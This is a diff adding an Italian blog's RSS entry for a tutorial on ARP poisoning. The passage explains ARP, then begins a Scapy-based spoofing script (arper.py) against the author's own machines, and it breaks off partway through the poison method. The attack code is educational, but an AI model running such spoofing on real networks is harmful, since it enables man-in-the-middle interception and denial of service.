@@ -22,13 +22,326 @@ Detto questo, happy coding e sopratutto, happy hacking 👽.&lt;/p&gt;
     </item>
     
     <item>
+      <title>Introduzione All&#39;ARP Poisoning</title>
+      <link>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</guid>
+      <description>Table Of Contents:
+ Cos&amp;rsquo;è il Protocollo ARP Che cos’è l’ARP Poisoning ARP Poisoning con Scapy e Python  In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l&amp;rsquo;ARP Poisoning.
+Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.
+Cos&amp;rsquo;è il Protocollo ARP Per approfondire l&amp;rsquo;argomento ti consigli di leggere questo.</description>
+      <content>&lt;p&gt;Table Of Contents:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#cos---il-protocollo-arp&#34;&gt;Cos&amp;rsquo;è il Protocollo ARP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#che-cos---l-arp-poisoning&#34;&gt;Che cos’è l’ARP Poisoning&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#arp-poisoning-con-scapy-e-python&#34;&gt;ARP Poisoning con Scapy e Python&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In questi giorni ho letto &lt;em&gt;Python per Hacker (seconda edizione)&lt;/em&gt; e mi sono imbattuto durante la lettura in un argomento
+molto interessante, ossia &lt;strong&gt;l&amp;rsquo;ARP Poisoning&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.&lt;/p&gt;
+&lt;h1 id=&#34;cosè-il-protocollo-arp&#34;&gt;Cos&amp;rsquo;è il Protocollo ARP&lt;/h1&gt;
+&lt;p&gt;Per approfondire l&amp;rsquo;argomento ti consigli di leggere &lt;a href=&#34;https://www.ionos.it/digitalguide/server/sicurezza/arp-poisoning-attacchi-dalla-rete-locale/&#34;&gt;questo&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;A differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l’indirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell’hardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si può applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell’indirizzo tramite ARP è perciò indispensabile.&lt;/p&gt;
+&lt;p&gt;Se ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l’indirizzo MAC appropriato. Così entra in azione l’Address Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l’indirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese “ARP request”) a tutti i dispositivi in rete, questa richiesta comprende all’incirca le seguenti informazioni:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Un computer con l&amp;rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l&amp;rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l&amp;rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell&amp;rsquo;indirizzo MAC giusto.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete è collegato a una tabella locale, detta cache ARP, per evitare che prima dell’invio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell’IP assegnato.&lt;/p&gt;
+&lt;p&gt;Tutti i computer nella rete annotano così nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Però ci si aspetta una risposta broadcast solo dal computer B, che invia un’ARP reply comprendente le seguenti informazioni:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Qui il sistema con l&amp;rsquo;indirizzo IP zzz.zzz.zzz.zzz. L&amp;rsquo;indirizzo MAC ricercato è aa-aa-aa-aa-aa-aa.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Se un’ARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perciò la comunicazione attraverso la rete locale non incontra nessun ostacolo.&lt;/p&gt;
+&lt;p&gt;Ma cosa succede se non è il computer di destinazione ricercato a rispondere, bensì un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l’ARP poisoning.&lt;/p&gt;
+&lt;p&gt;Ora che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante può usare le falle del protocollo per i suoi scopi.&lt;/p&gt;
+&lt;h1 id=&#34;che-cosè-larp-poisoning&#34;&gt;Che cos’è l’ARP Poisoning&lt;/h1&gt;
+&lt;p&gt;Lo schema request-response del protocollo ARP è creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell’ARP spoofing, gli hacker cercano perciò di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare così la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perché si intende un “avvelenamento” della cache ARP. Di solito il pacchetto comprende anche l’indirizzo MAC di un dispositivo di rete, controllato dall’hacker. Il sistema della vittima collega così l’IP di uscita con un indirizzo dell’hardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall’hacker, che ha così la possibilità di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene così con l’inganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bensì rifiutati, l’ARP poisoning può comportare un Denial of Service (DoS). Un’altra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; però questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l’intenzione di accettare una risposta.
+È quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.&lt;/p&gt;
+&lt;h1 id=&#34;arp-poisoning-con-scapy-e-python&#34;&gt;ARP Poisoning con Scapy e Python&lt;/h1&gt;
+&lt;p&gt;Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Quello che starete per vedere è un esempio di attacco informatico che sto svolgendo su sistemi di mia proprietà. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione è un illecito. ⚠️&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.&lt;/p&gt;
+&lt;p&gt;Per prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ifconfig &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;interface&lt;/em&gt; dovrà essere sostituito con il nome dell’interfaccia di rete della macchina vittima, nel mio caso l’interfaccia è wlp61s0, l’output dovrà essere un qualcosa simile a:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wlp61s0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
+        inet 192.168.1.22  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::bf57:5b8e:8ef6:fe0b  prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;  scopeid 0x20&amp;lt;link&amp;gt;
+        ether b4:6b:fc:a3:63:99  txqueuelen &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ethernet&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        RX packets &lt;span style=&#34;color:#ae81ff&#34;&gt;190150&lt;/span&gt;  bytes &lt;span style=&#34;color:#ae81ff&#34;&gt;230866258&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;230.8 MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        RX errors &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  dropped &lt;span style=&#34;color:#ae81ff&#34;&gt;2237&lt;/span&gt;  overruns &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  frame &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+        TX packets &lt;span style=&#34;color:#ae81ff&#34;&gt;52365&lt;/span&gt;  bytes &lt;span style=&#34;color:#ae81ff&#34;&gt;14313727&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;14.3 MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+        TX errors &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  dropped &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; overruns &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  carrier &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  collisions &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il comando ifconfig ci mostra la configurazione della rete per un’interfaccia specifica (in quest’esempio è la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.&lt;/p&gt;
+&lt;p&gt;L’output mostra che l’indirizzo &lt;strong&gt;inet&lt;/strong&gt; (IPv4) per il dispositivo è 192.168.1.22. È mostrato anche l’indirizzo mac ether che è b4:6b:fc:a3:63:99.&lt;/p&gt;
+&lt;p&gt;Ora vediamo la cache ARP della macchina vittima, usiamo il comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;arp -a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il risultato è qualcosa del tipo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wind3.hub &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a b8:d5:26:69:b5:dc &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
+Kobra3390.wind3.hub &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.233&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;192.168.1.233 è l’indirizzo IP della macchina Kali, mentre 192.168.1.1 è l’indirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell’indirizzo MAC registrato per il gateway.&lt;/p&gt;
+&lt;p&gt;Conoscendo l’indirizzo IP dell’attaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; multiprocessing &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Process
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (ARP, Ether, conf, get_if_hwaddr, 
+                        send, sniff, sndrcv, srp, wrpcap)
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restore&lt;/span&gt;(self):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    (victim, gateway, interface) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
+    myarp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arper(victim, gateway, interface)
+    myarp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come si vede, definiamo una funzione helper per ottenere l’ indirizzo MAC per una determinata macchina e una classe &lt;strong&gt;Arper&lt;/strong&gt; per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione &lt;strong&gt;get_mac&lt;/strong&gt; che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
+    packet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ether(dst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ARP(op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;who-has&amp;#34;&lt;/span&gt;, pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;targetip)
+    resp, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; srp(packet, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, retry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, verbose&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _, r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r[Ether]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;src
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le passiamo l’indirizzo IP dell’obiettivo e creiamo un pacchetto. La funzione &lt;strong&gt;Ether&lt;/strong&gt; specifica che il pacchetto è concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l’indirizzo MAC collegato chiedendo a ogni nodo della rete se è in possesso di quell’indirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy &lt;strong&gt;srp&lt;/strong&gt; che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile &lt;strong&gt;resp&lt;/strong&gt; che dovrebbe contenere la sorgente &lt;strong&gt;Ether&lt;/strong&gt; (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe &lt;strong&gt;Arper&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(victim)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gateway
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(gateway)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
+        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
+        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;verb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Initialized &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gateway (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;gateway&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Victim (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;victim&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l’interfaccia che vogliamo utilizzare (&lt;em&gt;eth0&lt;/em&gt; è l’opzione di default). Popoliamo le variabili interne dell’oggetto con &lt;strong&gt;interface&lt;/strong&gt;, &lt;strong&gt;victim&lt;/strong&gt;, &lt;strong&gt;victimmac&lt;/strong&gt;, &lt;strong&gt;gateway&lt;/strong&gt; e &lt;strong&gt;gatewaymac&lt;/strong&gt; stampandone i valori a console.&lt;/p&gt;
+&lt;p&gt;All’interno della classe &lt;strong&gt;Arper&lt;/strong&gt; scriviamo la funzione run che rappresenta l’entry point del nostro attacco:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
+
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;run&lt;/strong&gt; esegue tutto il lavoro principale dell’oggetto &lt;strong&gt;Arper&lt;/strong&gt;. Imposta ed esegue due processi:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Il primo avvelena la cache ARP&lt;/li&gt;
+&lt;li&gt;Il secondo ci permette di osservare l’evoluzione dell’attacco sniffando il traffico di rete&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Il metodo &lt;strong&gt;poison&lt;/strong&gt; produce i pacchetti “avvelenati” e li invia alla vittima e al gateway:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
+        poison_victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
+        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
